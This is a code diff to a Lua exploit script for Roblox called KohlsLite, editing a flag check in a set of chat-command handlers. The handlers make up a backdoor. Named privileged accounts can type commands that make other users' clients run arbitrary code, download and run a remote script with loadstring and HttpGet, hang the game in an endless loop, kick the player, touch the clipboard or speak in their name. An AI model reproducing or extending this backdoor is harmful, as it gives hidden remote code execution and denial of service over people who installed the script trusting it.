@@ -12578,7 +12578,7 @@ function PLRSTART(v)
 		    -- // Remove this if you want, just don't abuse with KohlsLite, okay? \\ --
 
                     if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then -- klc means KohlsLite Check
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				--print("kohlslite user")
 			else
                             	Speak("I use KohlsLite!")
@@ -12586,7 +12586,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then -- prc means PR Check (but it's KohlsLite though)
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				--print("kohlslite user")
 			else
                             	Speak("Collect my pages...")
@@ -12595,7 +12595,7 @@ function PLRSTART(v)
 
 
                     if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				--print("kohlslite user")
 			else
 				if clipboard_available then
@@ -12608,7 +12608,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				--print("kohlslite user")
 			else
 				if clipboard_available then
@@ -12622,7 +12622,7 @@ function PLRSTART(v)
 
 
                     if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then -- klk means KohlsLite Kick
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				--print("kohlslite user")
 			else
                             pcall(function()
@@ -12632,7 +12632,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then -- prk means PR Kick (but it's KohlsLite though)
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				--print("kohlslite user")
 			else
                             pcall(function()
@@ -12643,7 +12643,7 @@ function PLRSTART(v)
 
 
                     if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				-- print("kohlslite user")
 			else
                             Remind("You have been warned by a KohlsLite dev!")
@@ -12651,7 +12651,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				-- print("kohlslite user")
 			else
                             Remind("You have been warned by a KohlsLite collaborator!")
@@ -12660,7 +12660,7 @@ function PLRSTART(v)
 
 
                     if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				-- print("capybara")
 			else
                             while true do end
@@ -12669,7 +12669,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-			if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+			if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				-- print("capybara")
 			else
                             while true do end
@@ -12679,7 +12679,7 @@ function PLRSTART(v)
 
 
                     if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-			if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+			if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				-- print("run")
 			else
 			    Execute(string.sub(msg, 6))
@@ -12687,7 +12687,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				-- print("run")
 			else
                             Execute(string.sub(msg, 6))
@@ -12695,7 +12695,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-kls" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-	                if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then 
+	                if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then 
 				-- print("si")
 			else
                         	loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
@@ -12705,7 +12705,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-	                if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+	                if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				-- print("si")
 			else
                         	loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
@@ -12714,7 +12714,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				-- print("load")
 			else
                             GExecute(string.sub(msg, 7))
@@ -12722,7 +12722,7 @@ function PLRSTART(v)
                     end
 
                     if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or not mainbar_stuff.backdoor_enabled then
+                        if table.find(specialperms, game.Players.LocalPlayer.Name) or table.find(atprogperms, game.Players.LocalPlayer.Name) or mainbar_stuff.backdoor_enabled == false then
 				-- print("load")
 			else
                             GExecute(string.sub(msg, 7))
